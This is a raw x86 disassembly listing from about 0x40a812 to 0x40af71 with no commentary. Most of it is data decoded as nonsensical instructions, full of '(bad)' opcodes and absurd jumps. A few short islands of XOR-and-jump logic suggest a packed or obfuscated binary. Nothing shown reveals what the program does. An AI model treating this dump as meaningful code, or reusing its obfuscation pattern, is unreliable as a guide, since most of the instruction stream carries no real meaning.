  40a812:	call   0x7b1b4b92
  40a817:	xlat   BYTE PTR ds:[ebx]
  40a818:	(bad)  [edi+0x2c70cbda]
  40a81e:	sbb    DWORD PTR cs:[edx],ecx
  40a821:	adc    DWORD PTR [ebp-0x47],ecx
  40a824:	lods   al,BYTE PTR ds:[esi]
  40a825:	call   0x77ef:0xabcbfd6f
  40a82c:	cmp    BYTE PTR [edi+0x6c5b566f],dl
  40a832:	aas    
  40a833:	ret    0x1335
  40a836:	popa   
  40a837:	sar    dl,cl
  40a839:	gs push esp
  40a83b:	out    0x1c,al
  40a83d:	push   ss
  40a83e:	cmp    BYTE PTR [eax+0x4a],bl
  40a841:	jmp    DWORD PTR [esi-0x6083560]
  40a847:	jecxz  0x40a828
  40a849:	aam    0x27
  40a84b:	xor    esi,DWORD PTR [ebx]
  40a84d:	push   ss
  40a84e:	lods   eax,DWORD PTR ds:[esi]
  40a84f:	push   esi
  40a850:	into   
  40a851:	aam    0x12
  40a853:	hlt    
  40a854:	in     al,0x57
  40a856:	stos   BYTE PTR es:[edi],al
  40a857:	add    DWORD PTR [edx],0x39
  40a85a:	cmp    eax,0x4a8d17c7
  40a85f:	enter  0x4218,0x7e
  40a863:	push   ebp
  40a864:	sbb    dh,ah
  40a866:	pmaddwd mm2,QWORD PTR [eax-0x21]
  40a86a:	ret    
  40a86b:	sbb    BYTE PTR [ecx+0x6f35a497],al
  40a871:	loopne 0x40a8ab
  40a873:	xchg   edi,eax
  40a874:	ret    
  40a875:	arpl   WORD PTR [ebx+0x3b],di
  40a878:	jge    0x40a8a7
  40a87a:	mov    edi,0xb86ee7db
  40a87f:	loop   0x40a86f
  40a881:	push   esp
  40a882:	pop    edx
  40a883:	push   ss
  40a884:	adc    ch,BYTE PTR [ecx+0x9]
  40a887:	inc    edi
  40a888:	jecxz  0x40a8d3
  40a88a:	push   0x70e9048c
  40a88f:	sub    BYTE PTR [ebx+0x33],cl
  40a892:	jbe    0x40a843
  40a894:	xchg   ebx,eax
  40a896:	mov    eax,ds:0x95b9935b
  40a89b:	popa   
  40a89c:	or     dh,bl
  40a89e:	sub    al,0xf7
  40a8a0:	icebp  
  40a8a1:	loopne 0x40a8b2
  40a8a3:	sbb    esp,DWORD PTR [edx-0x1a5f5821]
  40a8a9:	mov    edi,0xfb3c9ca1
  40a8ae:	and    al,0xec
  40a8b0:	mov    ch,0x64
  40a8b2:	and    eax,0x4f703e6f
  40a8b7:	push   0xb19e8858
  40a8bc:	and    edx,DWORD PTR [ebp+eiz*4+0x3a891b18]
  40a8c3:	pop    eax
  40a8c4:	aad    0xea
  40a8c6:	iretw  
  40a8c8:	or     dl,BYTE PTR [edx-0x14]
  40a8cb:	xchg   edx,eax
  40a8cc:	call   0xf568ca2e
  40a8d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a8d2:	mov    ds:0xf5c8336b,eax
  40a8d7:	xchg   esp,eax
  40a8d8:	push   ss
  40a8d9:	loop   0x40a8bd
  40a8db:	sbb    ebp,DWORD PTR [ebp-0x62]
  40a8de:	pop    edx
  40a8df:	mov    al,ds:0x34ae87e4
  40a8e4:	(bad)  
  40a8e5:	fnstenv [ecx+0x2d]
  40a8e8:	mov    ecx,0xebe616da
  40a8ed:	dec    esp
  40a8ee:	mov    eax,0xf3101469
  40a8f3:	sub    al,0x11
  40a8f5:	loopne 0x40a919
  40a8f7:	cmp    ebp,DWORD PTR [ecx]
  40a8f9:	sti    
  40a8fa:	sbb    bl,BYTE PTR [ecx+edx*8+0x30]
  40a8fe:	push   edi
  40a8ff:	add    ch,ch
  40a901:	stc    
  40a902:	mov    ds:0xc2a5a2ae,eax
  40a907:	mov    ecx,DWORD PTR [eax-0x6f]
  40a90a:	out    0xd9,eax
  40a90c:	jne    0x40a922
  40a90e:	sbb    eax,0x25521464
  40a913:	dec    edx
  40a914:	add    ah,BYTE PTR [eax+0x20cabd3e]
  40a91a:	dec    ebx
  40a91b:	out    0x1f,al
  40a91d:	xchg   esi,eax
  40a91e:	mov    dl,0xd3
  40a920:	out    0x18,al
  40a922:	mov    DWORD PTR [eax],edi
  40a924:	mov    eax,DWORD PTR [ebp-0x14]
  40a927:	mov    ebx,DWORD PTR [ebp-0x8]
  40a92a:	mov    ecx,0x7510850
  40a92f:	xor    eax,ecx
  40a931:	mov    esi,0x327298
  40a936:	jmp    0x40ac4f
  40a93b:	(bad)  
  40a93c:	xlat   BYTE PTR ds:[ebx]
  40a93d:	rcl    bh,1
  40a93f:	aad    0xd7
  40a941:	(bad)
  40a944:	xchg   ebx,eax
  40a945:	cdq    
  40a946:	add    DWORD PTR [edx-0x42],ebx
  40a949:	push   ecx
  40a94a:	mov    dl,bl
  40a94c:	cmp    DWORD PTR [eax+0x78],0x74
  40a950:	jle    0x40a9ca
  40a952:	js     0x40a982
  40a954:	stc    
  40a955:	xor    ecx,DWORD PTR ds:[ebp-0x322b8d17]
  40a95c:	aad    0xe3
  40a95e:	adc    BYTE PTR [ebx],dl
  40a960:	sbb    DWORD PTR [ebx+0x5d765d24],ebx
  40a966:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a967:	pop    edx
  40a968:	add    eax,0x9018c88e
  40a96d:	(bad)  
  40a96e:	jo     0x40a979
  40a970:	jg     0x40a977
  40a972:	cmp    al,0xc4
  40a974:	pop    ecx
  40a975:	mov    cl,0x2f
  40a977:	shl    BYTE PTR [edi],1
  40a979:	and    DWORD PTR [esp+ebx*1+0x15],0x1d
  40a97e:	sahf   
  40a97f:	mov    eax,ds:0x298d2591
  40a984:	int    0x31
  40a986:	jge    0x40a9a4
  40a988:	fs pop es
  40a98a:	cmp    ebp,edi
  40a98c:	idiv   BYTE PTR [ebx]
  40a98e:	push   edx
  40a98f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a990:	sub    BYTE PTR [edi],bl
  40a992:	push   ss
  40a993:	or     al,0x33
  40a995:	mov    ds:0xed4ca7e4,al
  40a99a:	fcomi  st,st(3)
  40a99c:	pop    edi
  40a99d:	gs push 0x1d4ab0d2
  40a9a3:	sti    
  40a9a4:	inc    edi
  40a9a5:	neg    DWORD PTR [eax+0x60]
  40a9a8:	dec    edx
  40a9a9:	addr16 imul ebp,eax,0xa752a2a3
  40a9b0:	mov    ecx,0x270f9983
  40a9b5:	lock xchg esp,eax
  40a9b7:	sti    
  40a9b8:	mov    bh,0xf3
  40a9ba:	and    dh,BYTE PTR [ebx]
  40a9bc:	cmp    BYTE PTR [esi+0x5a8d896d],al
  40a9c2:	cli    
  40a9c3:	push   esi
  40a9c4:	push   edi
  40a9c5:	addr16 cmp al,0xb4
  40a9c8:	cs sahf 
  40a9ca:	xchg   DWORD PTR [ebx+ebx*2+0x45],esi
  40a9ce:	jo     0x40a98e
  40a9d0:	pop    es
  40a9d1:	(bad)  
  40a9d2:	cdq    
  40a9d3:	bound  edi,QWORD PTR fs:[eax+edx*8+0x6]
  40a9d8:	and    ch,BYTE PTR [edi-0x44d9792b]
  40a9de:	hlt    
  40a9df:	mov    BYTE PTR [eax],0xdd
  40a9e2:	jmp    0x78fcc629
  40a9e7:	jg     0x40aa0d
  40a9e9:	cs out 0xd1,eax
  40a9ec:	xchg   ebp,eax
  40a9ed:	hlt    
  40a9ee:	inc    eax
  40a9ef:	sbb    al,0x44
  40a9f1:	int3   
  40a9f2:	mov    ebx,0xcadcf065
  40a9f7:	cld    
  40a9f8:	mov    bh,0xba
  40a9fa:	jge    0x40aa3e
  40a9fc:	ret    
  40a9fd:	stos   BYTE PTR es:[edi],al
  40a9fe:	mov    bh,0x7b
  40aa00:	rcl    DWORD PTR [esi-0x75],1
  40aa03:	out    0x53,eax
  40aa05:	aam    0xb8
  40aa07:	test   eax,0xea52535b
  40aa0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aa0d:	pop    esi
  40aa0e:	mov    cs,WORD PTR [eax+0x68]
  40aa11:	imul   ecx,DWORD PTR [edi+0x78],0x7e
  40aa15:	test   DWORD PTR [ecx+0x3ddc48ae],edi
  40aa1b:	vmaxpd xmm2,xmm6,XMMWORD PTR [esi+0x1fe53379]
  40aa23:	push   esp
  40aa24:	jnp    0x40aa16
  40aa26:	or     ah,BYTE PTR [ebx]
  40aa28:	loope  0x40aa4c
  40aa2a:	repnz icebp 
  40aa2c:	popf   
  40aa2d:	fstp   QWORD PTR [eax-0x6e743a47]
  40aa33:	(bad)  
  40aa34:	scas   al,BYTE PTR es:[edi]
  40aa35:	scas   eax,DWORD PTR es:[edi]
  40aa36:	outs   dx,BYTE PTR ds:[esi]
  40aa37:	ffree  st(1)
  40aa39:	aam    0x98
  40aa3b:	cmp    edx,edi
  40aa3d:	push   ss
  40aa3e:	aas    
  40aa3f:	mov    ebx,0x8965e89c
  40aa44:	outs   dx,DWORD PTR ds:[esi]
  40aa45:	sub    bl,dl
  40aa47:	and    ebx,DWORD PTR [edx-0x29786d47]
  40aa4d:	push   esi
  40aa4e:	sub    eax,0x67a14937
  40aa53:	es rcl dh,cl
  40aa56:	mov    eax,DWORD PTR [ebx-0x36]
  40aa59:	leave  
  40aa5a:	mov    al,0x95
  40aa5c:	icebp  
  40aa5d:	sub    ch,BYTE PTR [edi+0x1b100b5c]
  40aa63:	fist   DWORD PTR [edx-0x70]
  40aa66:	fisttp QWORD PTR [ebx-0x6fe97244]
  40aa6c:	stos   DWORD PTR es:[edi],eax
  40aa6d:	xor    eax,0x343bf00f
  40aa72:	xchg   edi,eax
  40aa73:	iret   
  40aa74:	push   ds
  40aa75:	and    al,0xdc
  40aa77:	out    dx,eax
  40aa78:	outs   dx,DWORD PTR ds:[esi]
  40aa79:	push   0x234b3a7c
  40aa7e:	mov    edx,0x48fb692c
  40aa83:	fwait
  40aa84:	(bad)  
  40aa85:	pop    ss
  40aa86:	in     al,dx
  40aa87:	xchg   edi,eax
  40aa88:	adc    al,0x17
  40aa8a:	jp     0x40aaf0
  40aa8c:	or     al,0xf6
  40aa8e:	(bad)  
  40aa8f:	sahf   
  40aa90:	pop    eax
  40aa91:	shl    dh,1
  40aa93:	sahf   
  40aa94:	ret    0x502b
  40aa97:	test   al,0x28
  40aa99:	jmp    0xa0aed992
  40aa9e:	pop    ebx
  40aa9f:	mov    ds:0x1ce37f65,al
  40aaa4:	test   DWORD PTR [esi-0x44],ebp
  40aaa7:	(bad)  
  40aaa8:	ins    DWORD PTR es:[edi],dx
  40aaa9:	jl     0x40aaf6
  40aaab:	push   0xf72f08bb
  40aab0:	push   edi
  40aab1:	fwait
  40aab2:	iret   
  40aab3:	cld    
  40aab4:	test   al,0x34
  40aab6:	or     eax,0x2b9cbb0b
  40aabb:	ins    DWORD PTR es:[edi],dx
  40aabc:	das    
  40aabd:	push   ecx
  40aabe:	icebp  
  40aabf:	jbe    0x40aadb
  40aac1:	sub    al,0x40
  40aac3:	into   
  40aac4:	dec    DWORD PTR [ecx]
  40aac6:	pop    eax
  40aac7:	(bad)  
  40aac8:	sar    bh,cl
  40aaca:	sub    al,0x81
  40aacc:	jl     0x40aaf3
  40aace:	push   ss
  40aacf:	test   al,0x96
  40aad1:	(bad)  
  40aad2:	push   ebx
  40aad3:	out    0xd6,al
  40aad5:	mov    BYTE PTR [ebx+eiz*4+0x2c],ah
  40aad9:	popf   
  40aada:	aas    
  40aadb:	fs out dx,eax
  40aadd:	mov    edi,0x1a7ac716
  40aae2:	cdq    
  40aae3:	sub    al,0x64
  40aae5:	or     BYTE PTR [esi-0x43],0x6c
  40aae9:	pushf  
  40aaea:	or     esi,DWORD PTR [edi+0x6d]
  40aaed:	push   edi
  40aaee:	jge    0x40ab39
  40aaf0:	fimul  DWORD PTR [ebp+0x11435578]
  40aaf6:	push   ecx
  40aaf7:	mov    ds:0xe5d00ab,eax
  40aafc:	in     al,dx
  40aafd:	sbb    eax,0x72de665c
  40ab02:	pop    esp
  40ab03:	call   0x5d8623a1
  40ab08:	jae    0x40aaa4
  40ab0a:	(bad)  
  40ab0b:	into   
  40ab0c:	loopne 0x40aaaa
  40ab0e:	mov    ebp,0xf72148e3
  40ab13:	shr    DWORD PTR [eax-0x2b1209b5],cl
  40ab19:	mov    ebp,0xde1dfb1
  40ab1e:	sbb    BYTE PTR [ebp+0x71],dh
  40ab21:	sbb    DWORD PTR [eax+0x3],ecx
  40ab24:	icebp  
  40ab25:	sub    ah,BYTE PTR [edx]
  40ab27:	inc    esi
  40ab28:	pop    esi
  40ab29:	or     al,0x3d
  40ab2b:	ret    
  40ab2c:	leave  
  40ab2d:	add    ch,BYTE PTR [edx]
  40ab2f:	adc    DWORD PTR [esi-0x2a53dace],ecx
  40ab35:	jo     0x40ab3a
  40ab37:	inc    ecx
  40ab38:	(bad)  
  40ab39:	std    
  40ab3a:	fidivr DWORD PTR [ecx+0x55f2106]
  40ab40:	mov    dh,0x11
  40ab43:	jecxz  0x40aae4
  40ab45:	cwde   
  40ab46:	push   ss
  40ab47:	dec    edi
  40ab48:	sub    al,0xce
  40ab4a:	mov    bh,0x9c
  40ab4c:	dec    esi
  40ab4d:	adc    BYTE PTR [ecx],ah
  40ab4f:	jbe    0x40abcb
  40ab51:	pop    es
  40ab52:	sub    dl,BYTE PTR [esi-0x56]
  40ab55:	scas   al,BYTE PTR es:[edi]
  40ab56:	mov    esi,0x10d12d57
  40ab5b:	xchg   edi,eax
  40ab5c:	and    al,0x62
  40ab5e:	pushf  
  40ab5f:	(bad)  
  40ab60:	pop    ss
  40ab61:	aaa    
  40ab62:	jmp    0x40ab78
  40ab64:	cmp    eax,0x10e52a79
  40ab69:	arpl   WORD PTR [edx-0xd],bx
  40ab6c:	data16 clc 
  40ab6e:	test   al,0x10
  40ab70:	jo     0x40ab93
  40ab72:	test   al,0xbb
  40ab74:	mov    gs,eax
  40ab76:	mov    ebx,0xefbcbec8
  40ab7b:	(bad)  
  40ab7c:	mov    esi,0x9aff16b4
  40ab81:	scas   eax,DWORD PTR es:[edi]
  40ab82:	mov    bl,0xc8
  40ab84:	pop    ebx
  40ab85:	hlt    
  40ab86:	les    eax,FWORD PTR [ebx-0x18]
  40ab89:	cmp    ebx,esi
  40ab8b:	shl    ebx,cl
  40ab8d:	imul   ebx,esp,0xba646d1d
  40ab93:	shl    BYTE PTR ds:0x98a34263,0x2c
  40ab9a:	push   eax
  40ab9b:	call   0xf839:0xadc6a0c5
  40aba2:	pushf  
  40aba3:	out    dx,eax
  40aba4:	ins    BYTE PTR es:[edi],dx
  40aba5:	les    eax,FWORD PTR [eax+ecx*1]
  40aba8:	mov    al,ds:0xb09a47f7
  40abad:	retf   0x4a3b
  40abb0:	out    0x1,al
  40abb2:	push   ebp
  40abb3:	ss (bad) 
  40abb5:	cwde   
  40abb6:	lods   al,BYTE PTR ds:[esi]
  40abb7:	inc    ecx
  40abb8:	std    
  40abb9:	xor    DWORD PTR [edx],ecx
  40abbb:	fsubrp st(5),st
  40abbd:	mov    ds:0x37853356,al
  40abc2:	std    
  40abc3:	fs push ebp
  40abc5:	sti    
  40abc6:	xor    eax,0x53b77ffb
  40abcb:	lahf   
  40abcc:	mov    eax,ds:0xb6aeffe7
  40abd1:	icebp  
  40abd2:	int3   
  40abd3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40abd4:	mov    edi,0x141da328
  40abd9:	jnp    0x40ab91
  40abdb:	aad    0x37
  40abdd:	scas   eax,DWORD PTR es:[edi]
  40abde:	xor    eax,0x649236f9
  40abe3:	(bad)  
  40abe4:	ror    BYTE PTR ds:0x17963342,cl
  40abea:	mov    al,0xf3
  40abec:	jnp    0x40abce
  40abee:	cmp    bl,BYTE PTR [ebx-0x1b]
  40abf1:	shl    BYTE PTR ds:0xc6ef5e09,cl
  40abf7:	and    eax,0xd90152ef
  40abfc:	add    edx,DWORD PTR [ebp+0x52]
  40abff:	fild   QWORD PTR [eax+0x9]
  40ac02:	mov    bl,0x6f
  40ac04:	icebp  
  40ac05:	loope  0x40abd7
  40ac07:	dec    edx
  40ac08:	outs   dx,BYTE PTR ds:[esi]
  40ac09:	test   eax,0x349f5073
  40ac0e:	std    
  40ac0f:	cdq    
  40ac10:	xor    bh,BYTE PTR [ebp+edx*4-0x5815829c]
  40ac17:	loopne 0x40ac15
  40ac19:	fst    QWORD PTR [edx-0x35]
  40ac1c:	idiv   DWORD PTR [eax]
  40ac1e:	mov    esp,0x53f8da46
  40ac23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ac24:	ins    BYTE PTR es:[edi],dx
  40ac25:	mov    ebx,0xd0feea63
  40ac2a:	retf   0x6e69
  40ac2d:	adc    BYTE PTR [ebx+0x45da5359],bh
  40ac33:	fsubr  st(7),st
  40ac35:	mov    eax,DWORD PTR [ecx+0x6f7cab76]
  40ac3b:	jmp    0x40acb4
  40ac3d:	sbb    DWORD PTR [edi+0x3e],ebp
  40ac40:	cmp    DWORD PTR [ecx+0x4b5e613f],esi
  40ac46:	aaa    
  40ac47:	sbb    al,0xd2
  40ac49:	dec    ebx
  40ac4a:	sbb    al,0xa6
  40ac4c:	mov    eax,0xd9333027
  40ac51:	xor    edx,edx
  40ac53:	add    eax,esi
  40ac55:	add    ebx,esi
  40ac57:	div    ebx
  40ac59:	mov    edx,DWORD PTR [ebp-0x20]
  40ac5c:	mov    DWORD PTR [ebp-0x2c],0x4f35
  40ac63:	cmp    eax,DWORD PTR [edx]
  40ac65:	je     0x40c955
  40ac6b:	mov    DWORD PTR [ebp-0xc],0x705fd8e
  40ac72:	lea    eax,[ebp-0xc]
  40ac75:	mov    DWORD PTR [ebp-0x10],eax
  40ac78:	mov    eax,DWORD PTR [ebp-0x10]
  40ac7b:	jmp    0x40af94
  40ac80:	aas    
  40ac81:	aas    
  40ac82:	iret   
  40ac83:	(bad)  
  40ac84:	iret   
  40ac85:	xlat   BYTE PTR ds:[ebx]
  40ac86:	xlat   BYTE PTR ds:[ebx]
  40ac87:	(bad)  
  40ac88:	fist   WORD PTR [eax]
  40ac8a:	push   eax
  40ac8b:	cmovge edi,DWORD PTR [esi+eax*8]
  40ac8f:	sub    dh,dl
  40ac91:	cmp    BYTE PTR [eax+0x78],0x74
  40ac95:	jle    0x40ad0f
  40ac97:	js     0x40ace3
  40ac99:	or     al,0xde
  40ac9b:	xchg   ebx,eax
  40ac9c:	cld    
  40ac9d:	ins    BYTE PTR es:[edi],dx
  40ac9e:	jge    0x40ad19
  40aca0:	outs   dx,DWORD PTR ds:[esi]
  40aca1:	mov    ch,0x31
  40aca3:	stc    
  40aca4:	sbb    ebp,DWORD PTR [edx]
  40aca6:	push   0x6b
  40aca8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aca9:	stc    
  40acaa:	iret   
  40acab:	or     ch,BYTE PTR ds:0xcbde6d59
  40acb1:	xor    ebp,DWORD PTR [ecx+0x4c04de87]
  40acb7:	test   al,0xdd
  40acb9:	pop    edi
  40acba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40acbb:	add    ch,BYTE PTR [edx+0x50dbe469]
  40acc1:	dec    ebp
  40acc2:	mov    ah,0x7a
  40acc4:	and    eax,ebx
  40acc6:	test   al,0x49
  40acc8:	lds    ebp,FWORD PTR [edx-0xf]
  40accb:	jge    0x40ac7c
  40accd:	repnz scas al,BYTE PTR es:[edi]
  40accf:	lahf   
  40acd0:	sbb    BYTE PTR [ecx+edi*1+0xe887365],0x66
  40acd8:	mov    ds:0x33acdc0a,eax
  40acdd:	das    
  40acde:	inc    eax
  40acdf:	out    0x2c,eax
  40ace1:	out    dx,eax
  40ace2:	xchg   edi,eax
  40ace3:	or     cl,BYTE PTR [esi]
  40ace5:	cmp    BYTE PTR [eax-0x330d395d],bh
  40aceb:	push   esi
  40acec:	xor    ebp,0x76dabee3
  40acf2:	leave  
  40acf3:	xchg   ebx,eax
  40acf4:	fwait
  40acf5:	cmp    al,0xb4
  40acf7:	mov    cl,0xc8
  40acf9:	mov    dl,0x36
  40acfb:	mov    ds:0xade197cf,al
  40ad00:	sub    al,0xe0
  40ad02:	cmp    DWORD PTR [ebx+0x5d88da0],esi
  40ad08:	mov    dl,dh
  40ad0a:	and    BYTE PTR [ebp+0x7c6d201e],0xdb
  40ad11:	inc    edi
  40ad12:	add    esi,DWORD PTR [edi+0x29]
  40ad15:	aaa    
  40ad16:	stos   BYTE PTR es:[edi],al
  40ad17:	push   eax
  40ad18:	shl    DWORD PTR [edx-0x46a30f9d],0x6d
  40ad1f:	sub    eax,0x7fab4830
  40ad24:	(bad)  
  40ad25:	retf   
  40ad26:	mov    esi,0x7fabaac1
  40ad2b:	enter  0x1d67,0xe0
  40ad2f:	gs pop esi
  40ad31:	popf   
  40ad32:	push   edx
  40ad33:	inc    esi
  40ad34:	lods   al,BYTE PTR ds:[esi]
  40ad35:	mov    es,WORD PTR [ebp+eax*8-0x19406ed8]
  40ad3c:	mov    ds:0xec283ba0,al
  40ad41:	pop    ds
  40ad42:	adc    esp,DWORD PTR [edi+eax*4]
  40ad45:	or     eax,0x20150211
  40ad4a:	(bad)  
  40ad4b:	jge    0x40ad68
  40ad4d:	xchg   edi,eax
  40ad4e:	popa   
  40ad4f:	pop    DWORD PTR [ebx]
  40ad51:	sub    BYTE PTR [ebx+edx*8],ch
  40ad54:	jo     0x40ad43
  40ad56:	push   edi
  40ad57:	and    BYTE PTR [ebp+ebx*8-0x3d368ea8],al
  40ad5e:	repz and BYTE PTR [edi+0x1d9ff2b9],0x47
  40ad66:	sbb    dl,BYTE PTR [eax+0x1b6292b6]
  40ad6c:	sub    al,0x38
  40ad6e:	sub    ebx,edi
  40ad70:	sbb    esi,DWORD PTR [ebx-0x6577441b]
  40ad76:	mov    eax,0xb831ae75
  40ad7b:	pop    edi
  40ad7c:	les    ebp,FWORD PTR es:[eax+ebp*1-0x3e]
  40ad81:	mov    fs,WORD PTR [esi-0x368d760c]
  40ad87:	dec    esp
  40ad88:	fadd   QWORD PTR [eax]
  40ad8a:	pop    eax
  40ad8b:	inc    esp
  40ad8c:	xor    bl,BYTE PTR [esi-0x40e0dc28]
  40ad92:	sbb    cl,BYTE PTR [ecx-0x7]
  40ad95:	jmp    0x40adb3
  40ad97:	pand   mm0,QWORD PTR [edi]
  40ad9a:	jne    0x40ad68
  40ad9c:	in     eax,dx
  40ad9d:	xor    edx,eax
  40ad9f:	push   edx
  40ada0:	repz dec BYTE PTR [esi]
  40ada3:	xor    ecx,esp
  40ada5:	adc    DWORD PTR [esi+eiz*8+0x17],ebx
  40ada9:	jo     0x40ade8
  40adab:	mov    dl,0x69
  40adad:	outs   dx,DWORD PTR ds:[esi]
  40adae:	mov    cl,0x55
  40adb0:	icebp  
  40adb1:	inc    esp
  40adb2:	ret    0x46ae
  40adb5:	inc    ebx
  40adb6:	mov    ecx,0x2bd6ba36
  40adbb:	pushf  
  40adbc:	into   
  40adbd:	dec    esp
  40adbe:	cdq    
  40adbf:	pop    edi
  40adc0:	mov    ds:0xe487685e,al
  40adc5:	inc    eax
  40adc6:	add    dh,BYTE PTR [esi+0x70]
  40adc9:	inc    esp
  40adca:	adc    esi,DWORD PTR [ecx-0x2a1e1f32]
  40add0:	mov    ebx,0x64bf0014
  40add5:	xchg   ecx,eax
  40add6:	push   0x3b7d11eb
  40addb:	scas   al,BYTE PTR es:[edi]
  40addc:	adc    eax,0xc5d25c96
  40ade1:	dec    esi
  40ade2:	mov    ch,BYTE PTR [edx+0x14]
  40ade5:	push   ds
  40ade6:	test   al,0x28
  40ade8:	add    eax,0xce6066f5
  40aded:	in     al,0x84
  40adef:	fwait
  40adf0:	mov    edx,0xb0c7f696
  40adf5:	push   0xffffff9c
  40adf7:	mov    DWORD PTR [ebp+0x2b4022c6],eax
  40adfd:	in     eax,dx
  40adfe:	or     esi,DWORD PTR [edx-0x54]
  40ae01:	jmp    0xd6a126dd
  40ae06:	xchg   BYTE PTR [edx+0x39e15aa5],cl
  40ae0c:	jmp    0x40ae32
  40ae0e:	outs   dx,BYTE PTR ds:[esi]
  40ae0f:	push   0x66c3ebb0
  40ae14:	in     al,0x85
  40ae16:	jle    0x40adfb
  40ae18:	call   0x6293:0xca432b50
  40ae1f:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  40ae21:	aas    
  40ae22:	fcomp  DWORD PTR [esp+esi*2-0x62]
  40ae26:	outs   dx,DWORD PTR ds:[esi]
  40ae27:	inc    edi
  40ae28:	sbb    eax,0x7d5afbd0
  40ae2d:	xlat   BYTE PTR ds:[ebx]
  40ae2e:	out    dx,al
  40ae2f:	rol    DWORD PTR [edi+0x69],1
  40ae32:	jmp    0x42803501
  40ae37:	js     0x40aea1
  40ae39:	imul   esp,DWORD PTR [edx+0x3c],0xd
  40ae3d:	or     al,0xa2
  40ae3f:	jle    0x40ae36
  40ae41:	pusha  
  40ae42:	lods   al,BYTE PTR ds:[esi]
  40ae43:	mov    edi,0x24eacc20
  40ae48:	mov    WORD PTR [edx-0x4e36b8a4],sp
  40ae4f:	cmp    al,0x58
  40ae51:	aas    
  40ae52:	fcmovnu st,st(1)
  40ae54:	int3   
  40ae55:	push   edx
  40ae56:	xchg   ecx,eax
  40ae57:	jl     0x40ae7a
  40ae59:	not    BYTE PTR [edx-0x2a8aabd0]
  40ae5f:	cli    
  40ae60:	and    ah,al
  40ae62:	and    cl,bl
  40ae64:	je     0x40ae93
  40ae66:	pushf  
  40ae67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ae68:	loope  0x40ae50
  40ae6a:	(bad)  
  40ae6b:	clc    
  40ae6c:	inc    edi
  40ae6d:	sbb    eax,0x648b7fc3
  40ae72:	retf   
  40ae73:	pop    esi
  40ae74:	xor    ebp,eax
  40ae76:	add    eax,0xc48e6613
  40ae7b:	add    ecx,edi
  40ae7d:	mov    ch,0xa7
  40ae7f:	and    ebp,DWORD PTR [eax+0x6a]
  40ae82:	pop    esp
  40ae83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae84:	ins    DWORD PTR es:[edi],dx
  40ae85:	ficom  DWORD PTR [ebx+edx*2+0x70]
  40ae89:	repz fstp st(2)
  40ae8c:	test   al,0x5b
  40ae8e:	or     al,0x96
  40ae90:	(bad)  
  40ae91:	hlt    
  40ae92:	sbb    BYTE PTR [edi-0x2b],0xab
  40ae96:	jecxz  0x40ae4f
  40ae98:	push   ecx
  40ae99:	loopne 0x40ae43
  40ae9b:	out    dx,eax
  40ae9c:	xlat   BYTE PTR ds:[ebx]
  40ae9d:	lds    esp,FWORD PTR [eax+edx*2-0x14aa3bb]
  40aea4:	mov    ds:0x7ef5bf,al
  40aea9:	(bad)  
  40aeab:	add    BYTE PTR [ebx-0x1],bh
  40aeae:	fcmovb st,st(4)
  40aeb0:	mov    bh,0x74
  40aeb2:	push   eax
  40aeb3:	inc    ebx
  40aeb4:	cmp    bh,BYTE PTR [ebx]
  40aeb6:	pop    ss
  40aeb7:	mov    eax,ds:0x9cfb8132
  40aebc:	xlat   BYTE PTR ds:[ebx]
  40aebd:	mov    ch,0xde
  40aebf:	(bad)  
  40aec0:	stos   BYTE PTR es:[edi],al
  40aec1:	das    
  40aec2:	das    
  40aec3:	inc    ebx
  40aec4:	jge    0x40ae90
  40aec6:	push   ds
  40aec7:	adc    eax,0x33afd66d
  40aecc:	add    ebp,ebx
  40aece:	imul   ebp,DWORD PTR [edi-0x1f],0xffffff8a
  40aed2:	dec    ebp
  40aed3:	lods   eax,DWORD PTR ds:[esi]
  40aed4:	and    ebp,DWORD PTR [ecx+0x5d]
  40aed7:	out    0x5b,al
  40aed9:	xor    bl,BYTE PTR [eax-0x2106dd89]
  40aedf:	loopne 0x40ae6c
  40aee1:	inc    esi
  40aee2:	inc    ebx
  40aee3:	pop    ecx
  40aee4:	fst    DWORD PTR [edx+0xa2b7071]
  40aeea:	gs mov ebp,0x200d171e
  40aef0:	add    eax,0xc1c10e03
  40aef5:	add    eax,0xff9a5b24
  40aefa:	push   es
  40aefb:	rcl    DWORD PTR gs:[edi+0x51],0xef
  40af00:	add    al,0x66
  40af02:	sub    BYTE PTR [edi+0x35],0x18
  40af06:	fsub   QWORD PTR [ecx+esi*8+0x4653302]
  40af0d:	push   ss
  40af0e:	dec    esp
  40af0f:	inc    edx
  40af10:	test   eax,0xf7caa41
  40af15:	mov    BYTE PTR [eax+0x5d6a256f],dh
  40af1b:	cmp    ch,cl
  40af1d:	xchg   ebx,eax
  40af1e:	or     DWORD PTR [ebp-0x11],0x68
  40af22:	scas   eax,DWORD PTR es:[edi]
  40af23:	mov    ecx,0xd720ee65
  40af28:	lock mov esp,0xc9160246
  40af2e:	pop    ebp
  40af2f:	(bad)  
  40af30:	fisttp WORD PTR [ebp+0x0]
  40af33:	dec    ebx
  40af34:	push   ds
  40af35:	cli    
  40af36:	or     DWORD PTR [edx+0x15],esp
  40af39:	jae    0x40af71
  40af3b:	and    eax,0xb18cf512
  40af40:	das    
  40af41:	fwait
  40af42:	(bad)  
  40af43:	jae    0x40aeea
  40af45:	pushf  
  40af46:	rol    DWORD PTR [ebp+0x2330aa33],1
  40af4c:	inc    ecx
  40af4d:	push   esp
  40af4e:	adc    dh,bl
  40af50:	hlt    
  40af51:	sbb    al,BYTE PTR [esi]
  40af53:	mov    eax,DWORD PTR [eax-0x2af78a9b]
  40af59:	inc    ebp
  40af5a:	sahf   
  40af5b:	mov    bh,0x4d
  40af5d:	aad    0x12
  40af5f:	(bad)  
  40af60:	mov    ?,edx
  40af62:	(bad)  
  40af64:	add    dh,BYTE PTR [ebx-0x6e]
  40af67:	adc    esi,0x1b
  40af6a:	mov    ebx,0x7ca0b8da
  40af6f:	jne    0x40af28
  40af71:	and    ch,ah
